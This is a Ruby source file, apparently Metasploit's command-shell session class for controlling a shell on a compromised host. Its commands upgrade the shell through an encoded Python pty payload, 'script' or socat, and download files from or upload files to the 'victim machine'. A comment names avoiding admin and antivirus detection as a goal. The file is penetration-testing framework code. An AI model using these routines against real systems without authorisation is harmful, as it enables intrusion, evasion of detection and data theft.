# -*- coding: binary -*-
require 'msf/base'
require 'msf/base/sessions/scriptable'
require 'shellwords'
require 'rex/text/table'
require "base64"

module Msf
module Sessions

###
#
# This class provides basic interaction with a command shell on the remote
# endpoint.  This session is initialized with a stream that will be used
# as the pipe for reading and writing the command shell.
#
###
class CommandShell

  #
  # This interface supports basic interaction.
  #
  include Msf::Session::Basic

  #
  # This interface supports interacting with a single command shell.
  #
  include Msf::Session::Provider::SingleCommandShell

  include Msf::Session::Scriptable

  include Rex::Ui::Text::Resource

  ##
  # :category: Msf::Session::Scriptable implementors
  #
  # Executes the supplied script, must be specified as full path.
  #
  # Msf::Session::Scriptable implementor
  #
  def execute_file(full_path, args)
    o = Rex::Script::Shell.new(self, full_path)
    o.run(args)
  end

  #
  # Returns the type of session.
  #
  def self.type
    "shell"
  end

  def initialize(conn, opts = {})
    self.platform ||= ""
    self.arch     ||= ""
    self.max_threads = 1
    @cleanup = false
    datastore = opts[:datastore]
    if datastore && !datastore["CommandShellCleanupCommand"].blank?
      @cleanup_command = datastore["CommandShellCleanupCommand"]
    end
    super
  end

  #
  # Returns the session description.
  #
  def desc
    "Command shell"
  end

  #
  # Calls the class method
  #
  def type
    self.class.type
  end

  ##
  # :category: Msf::Session::Provider::SingleCommandShell implementors
  #
  # The shell will have been initialized by default.
  #
  def shell_init
    return true
  end

  #
  # List of supported commands.
  #
  def commands
    {
        'help'         =>  'Help menu',
        'background'   => 'Backgrounds the current shell session',
        'sessions'     => 'Quickly switch to another session',
        'resource'     => 'Run the commands stored in a file',
        'shell'        => 'Spawn an interactive shell (*NIX Only)',
        'download'     => 'Download files (*NIX Only)',
        'upload'       => 'Upload files (*NIX Only)',
    }
  end

  def cmd_help(*args)
    columns = ['Command', 'Description']
    tbl = Rex::Text::Table.new(
      'Header'  => 'Meta shell commands',
      'Prefix'  => "\n",
      'Postfix' => "\n",
      'Indent'  => 4,
      'Columns' => columns,
      'SortIndex' => -1
    )
    commands.each do |key, value|
      tbl << [key, value]
    end
    print(tbl.to_s)
  end

  def cmd_background_help
    print_line "Usage: background"
    print_line
    print_line "Stop interacting with this session and return to the parent prompt"
    print_line
  end

  def cmd_background(*args)
    if !args.empty?
      # We assume that background does not need arguments
      # If user input does not follow this specification
      # Then show help (Including '-h' '--help'...)
      return cmd_background_help
    end

    if prompt_yesno("Background session #{name}?")
      self.interacting = false
    end
  end

  def cmd_sessions_help
    print_line('Usage: sessions <id>')
    print_line
    print_line('Interact with a different session Id.')
    print_line('This command only accepts one positive numeric argument.')
    print_line('This works the same as calling this from the MSF shell: sessions -i <session id>')
    print_line
  end

  def cmd_sessions(*args)
    if args.length.zero? || args[0].to_i <= 0
      # No args
      return cmd_sessions_help
    end

    if args.length == 1 && (args[1] == '-h' || args[1] == 'help')
      # One arg, and args[1] => '-h' '-H' 'help'
      return cmd_sessions_help
    end

    if args.length != 1
      # More than one argument
      return cmd_sessions_help
    end

    if args[0].to_s == self.name.to_s
      # Src == Dst
      print_status("Session #{self.name} is already interactive.")
    else
      print_status("Backgrounding session #{self.name}...")
      # store the next session id so that it can be referenced as soon
      # as this session is no longer interacting
      self.next_session = args[0]
      self.interacting = false
    end
  end

  def cmd_resource(*args)
    if args.empty?
      cmd_resource_help
      return false
    end

    args.each do |res|
      good_res = nil
      if res == '-'
        good_res = res
      elsif ::File.exist?(res)
        good_res = res
      elsif
        # let's check to see if it's in the scripts/resource dir (like when tab completed)
      [
          ::Msf::Config.script_directory + ::File::SEPARATOR + 'resource' + ::File::SEPARATOR + 'meterpreter',
          ::Msf::Config.user_script_directory + ::File::SEPARATOR + 'resource' + ::File::SEPARATOR + 'meterpreter'
      ].each do |dir|
        res_path = ::File::join(dir, res)
        if ::File.exist?(res_path)
          good_res = res_path
          break
        end
      end
      end
      if good_res
        load_resource(good_res)
      else
        print_error("#{res} is not a valid resource file")
        next
      end
    end
  end

  def cmd_resource_help
    print_line "Usage: resource path1 [path2 ...]"
    print_line
    print_line "Run the commands stored in the supplied files. (- for stdin, press CTRL+D to end input from stdin)"
    print_line "Resource files may also contain ERB or Ruby code between <ruby></ruby> tags."
    print_line
  end

  def cmd_shell_help()
    print_line('Usage: shell')
    print_line
    print_line('Pop up an interactive shell via multi methods.')
    print_line('An interactive shell means that you can use several useful commands like `passwd`, `su [username]`')
    print_line('There are three implementation of it: ')
    print_line('\t1. using python `pty` module (default choice)')
    print_line('\t2. using `socat` command')
    print_line('\t3. using `script` command')
    print_line('\t4. upload a pty program via reverse shell')
    print_line
  end

  def cmd_shell(*args)
    if args.length == 1 && (args[1] == '-h' || args[1] == 'help')
      # One arg, and args[1] => '-h' '-H' 'help'
      return cmd_sessions_help
    end

    # Why `/bin/sh` not `/bin/bash`, some machine may not have `/bin/bash` installed, just in case. 
    # 1. Using python
    # 1.1 Check Python installed or not
    # We do not need to care about the python version
    # Beacuse python2 and python3 have the same payload of spawn a shell
    python_path = binary_exists("python")
    if python_path != nil
      # Payload: import pty;pty.spawn('/bin/sh')
      # Base64 encoded payload: aW1wb3J0IHB0eTtwdHkuc3Bhd24oJy9iaW4vc2gnKQ==
      print_status("Using `python` to pop up an interactive shell")
      shell_command("#{python_path} -c 'exec(\"aW1wb3J0IHB0eTtwdHkuc3Bhd24oJy9iaW4vc2gnKQ==\".decode(\"base64\"))'")
      return
    end

    # 2. Using script
    script_path = binary_exists("script")
    if script_path != nil
      print_status("Using `script` to pop up an interactive shell")
      # Payload: script /dev/null
      # Using /dev/null to make sure there is no log file on the target machine
      # Prevent being detected by the admin or antivirus softwares
      shell_command("#{script_path} /dev/null")
      return
    end

    # 3. Using socat
    socat_path = binary_exists("socat")
    if socat_path != nil
      # Payload: socat - exec:'bash -li',pty,stderr,setsid,sigint,sane
      print_status("Using `socat` to pop up an interactive shell")
      shell_command("#{socat_path} - exec:'/bin/sh -li',pty,stderr,setsid,sigint,sane")
      return
    end

    # 4. Using pty program
    # 4.1 Detect arch and destribution
    # 4.2 Real time compiling
    # 4.3 Upload binary
    # 4.4 Change mode of binary
    # 4.5 Execute binary

    print_error("Can not pop up an interactive shell")
  end
  
  #
  # Check if there is a binary in PATH env
  #
  def binary_exists(binary)
    print_status("Trying to find binary(#{binary}) on target machine")
    binary_path = shell_command_token("which #{binary}").strip
    if binary_path.eql?("#{binary} not found")
      print_error(binary_path)
      return nil
    else
      print_status("Found #{binary} at #{binary_path}")
      return binary_path
    end
  end

  #
  # Check if there is a file on the target machine
  #
  def file_exists(path)
    # Use `ls` command to check file exists
    # If file exists, `ls [path]` will echo the varible `path`
    # Or `ls` command will report an error message
    # But we can not ensure that the implementation of ls command are the same on different destribution
    # So just check the success flag not error message
    # eg:
    # $ ls /etc/passwd
    # /etc/passwd
    # $ ls /etc/nosuchfile
    # ls: cannot access '/etc/nosuchfile': No such file or directory
    result = shell_command_token("ls #{path}").strip
    if result.eql?(path)
      return true
    end
    return false
  end

  def cmd_download_help
    print_line("Usage: download [src] [dst]")
    print_line
    print_line("Downloads remote files to the local machine.")
    print_line("This command does not support to download a FOLDER yet")
    print_line
  end

  def cmd_download(*args)
    if args.length != 2
      # no argumnets, just print help message
      return cmd_download_help
    end

    src = args[0]
    dst = args[1]

    # Check if src exists
    if !file_exists(src)
      print_error("The target file does not exists")
      return
    end

    # Get file content
    print_status("Download #{src} => #{dst}")
    content = shell_command("cat #{src}")

    # Write file to local machine
    file = File.open(dst, "wb")
    file.write(content)
    file.close
    print_good("Done")
  end

  def cmd_upload_help
    print_line("Usage: upload [src] [dst]")
    print_line
    print_line("Uploads load file to the victim machine.")
    print_line("This command does not support to upload a FOLDER yet")
    print_line
  end

  def cmd_upload(*args)
    if args.length != 2
      # no argumnets, just print help message
      return cmd_upload_help
    end

    src = args[0]
    dst = args[1]

    # Check target file exists on the target machine
    if file_exists(dst)
      print_warning("The file <#{dst}> already exists on the target machine")
      if prompt_yesno("Overwrite the target file <#{dst}>?")
        # Create an empty file on the target machine
        # Notice here does not check the permission of the target file (folder)
        # So if you generate a reverse shell with out redirection the STDERR
        # you will not realise that the current user does not have permission to write to the target file
        # IMPORTANT:
        #   assume(the current have the write access on the target file)
        #   if (the current user can not write on the target file) && (stderr did not redirected)
        #     No error reporting, you must check the file created or not manually
        result = shell_command_token("cat /dev/null > #{dst}")
        if !result.empty?
          print_error("Create new file on the target machine failed. (#{result})")
          return
        end
        print_good("Create new file on the target machine succeed")
      else
        return
      end
    end

    buffer_size = 0x100

    begin
      # Open local file
      src_fd = open src
      # Get local file size
      src_size = File.size(src)
      # Calc how many time to append to the remote file
      times = src_size / buffer_size + (src_size % buffer_size == 0 ? 0 : 1)
      print_status("File <#{src}> size: #{src_size}, need #{times} times writes to upload")
      # Start transfer

      for i in 1..times do
        print_status("Uploading (#{i * buffer_size}/#{src_size})")
        chunk = src_fd.read(buffer_size)
        chunk_repr = repr(chunk)
        result = shell_command_token("echo -ne '#{chunk_repr}' >> #{dst}")
        if !result.empty?
          print_error("Appending content to the target file <#{dst}> failed. (#{result})")
          # Do some cleanup
          # Delete the target file
          shell_command_token("rm -rf #{dst}")
          print_status("Target file <#{dst}> deleted")
          return
        end
      end
      print_good("File <#{dst}> upload finished")
    rescue
      print_error("Error occurs while uploading <#{src}> to <#{dst}> ")
      return
    end
  end

  def repr(data)
    data_repr = ''
    data.each_char {|c|
      data_repr << "\\x"
      data_repr << c.unpack("H*")[0]
    }
    return data_repr
  end

  #
  # Explicitly runs a single line command.
  #
  def run_single(cmd)
    # Do nil check for cmd (CTRL+D will cause nil error)
    return unless cmd

    arguments = cmd.split(' ')
    method    = arguments.shift

    # Built-in command
    if commands.key?(method)
      return run_builtin_cmd(method, arguments)
    end

    # User input is not a built-in command, write to socket directly
    shell_write(cmd)
  end

  #
  # Run built-in command
  #
  def run_builtin_cmd(method, arguments)
    # Dynamic function call
    self.send('cmd_' + method, *arguments)
  end

  ##
  # :category: Msf::Session::Provider::SingleCommandShell implementors
  #
  # Explicitly run a single command, return the output.
  #
  def shell_command(cmd)
    # Send the command to the session's stdin.
    shell_write(cmd + "\n")

    timeo = 5
    etime = ::Time.now.to_f + timeo
    buff = ""

    # Keep reading data until no more data is available or the timeout is
    # reached.
    while (::Time.now.to_f < etime and (self.respond_to?(:ring) or ::IO.select([rstream], nil, nil, timeo)))
      res = shell_read(-1, 0.01)
      buff << res if res
      timeo = etime - ::Time.now.to_f
    end

    buff
  end

  ##
  # :category: Msf::Session::Provider::SingleCommandShell implementors
  #
  # Read from the command shell.
  #
  def shell_read(length=-1, timeout=1)
    begin
      rv = rstream.get_once(length, timeout)
      framework.events.on_session_output(self, rv) if rv
      return rv
    rescue ::Rex::SocketError, ::EOFError, ::IOError, ::Errno::EPIPE => e
      #print_error("Socket error: #{e.class}: #{e}")
      shell_close
      raise e
    end
  end

  ##
  # :category: Msf::Session::Provider::SingleCommandShell implementors
  #
  # Writes to the command shell.
  #
  def shell_write(buf)
    return unless buf

    begin
      framework.events.on_session_command(self, buf.strip)
      rstream.write(buf)
    rescue ::Rex::SocketError, ::EOFError, ::IOError, ::Errno::EPIPE => e
      #print_error("Socket error: #{e.class}: #{e}")
      shell_close
      raise e
    end
  end

  ##
  # :category: Msf::Session::Provider::SingleCommandShell implementors
  #
  # Closes the shell.
  # Note: parent's 'self.kill' method calls cleanup below.
  #
  def shell_close()
    self.kill
  end

  ##
  # :category: Msf::Session implementors
  #
  # Closes the shell.
  #
  def cleanup
    return if @cleanup

    @cleanup = true
    if rstream
      if !@cleanup_command.blank?
        # this is a best effort, since the session is possibly already dead
        shell_command_token(@cleanup_command) rescue nil

        # we should only ever cleanup once
        @cleanup_command = nil
      end

      # this is also a best-effort
      rstream.close rescue nil
      rstream = nil
    end
    super
  end

  #
  # Execute any specified auto-run scripts for this session
  #
  def process_autoruns(datastore)
    # Read the initial output and mash it into a single line
    if (not self.info or self.info.empty?)
      initial_output = shell_read(-1, 0.01)
      if (initial_output)
        initial_output.force_encoding("ASCII-8BIT") if initial_output.respond_to?(:force_encoding)
        initial_output.gsub!(/[\x00-\x08\x0b\x0c\x0e-\x19\x7f-\xff]+/n,"_")
        initial_output.gsub!(/[\r\n\t]+/, ' ')
        initial_output.strip!

        # Set the inital output to .info
        self.info = initial_output
      end
    end

    if datastore['InitialAutoRunScript'] && !datastore['InitialAutoRunScript'].empty?
      args = Shellwords.shellwords( datastore['InitialAutoRunScript'] )
      print_status("Session ID #{sid} (#{tunnel_to_s}) processing InitialAutoRunScript '#{datastore['InitialAutoRunScript']}'")
      execute_script(args.shift, *args)
    end

    if (datastore['AutoRunScript'] && datastore['AutoRunScript'].empty? == false)
      args = Shellwords.shellwords( datastore['AutoRunScript'] )
      print_status("Session ID #{sid} (#{tunnel_to_s}) processing AutoRunScript '#{datastore['AutoRunScript']}'")
      execute_script(args.shift, *args)
    end
  end

  attr_accessor :arch
  attr_accessor :platform
  attr_accessor :max_threads

protected

  ##
  # :category: Msf::Session::Interactive implementors
  #
  # Override the basic session interaction to use shell_read and
  # shell_write instead of operating on rstream directly.
  def _interact
    framework.events.on_session_interact(self)
    _interact_stream
  end

  ##
  # :category: Msf::Session::Interactive implementors
  #
  def _interact_stream
    fds = [rstream.fd, user_input.fd]
    while self.interacting
      sd = Rex::ThreadSafe.select(fds, nil, fds, 0.5)
      next unless sd

      if sd[0].include? rstream.fd
        user_output.print(shell_read)
      end
      if sd[0].include? user_input.fd
        run_single(user_input.gets)
      end
      Thread.pass
    end
  end
end

class CommandShellWindows < CommandShell
  def initialize(*args)
    self.platform = "windows"
    super
  end
  def shell_command_token(cmd,timeout = 10)
    shell_command_token_win32(cmd,timeout)
  end
end

class CommandShellUnix < CommandShell
  def initialize(*args)
    self.platform = "unix"
    super
  end
  def shell_command_token(cmd,timeout = 10)
    shell_command_token_unix(cmd,timeout)
  end
end

end
end